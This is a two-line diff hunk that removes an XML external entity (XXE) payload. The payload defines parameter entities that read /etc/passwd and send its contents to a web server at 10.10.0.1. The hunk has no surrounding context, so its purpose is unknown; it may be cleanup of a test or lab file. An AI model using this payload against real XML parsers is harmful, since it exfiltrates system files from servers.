@@ -1,2 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.0.1/?%file;'>">
-%all;
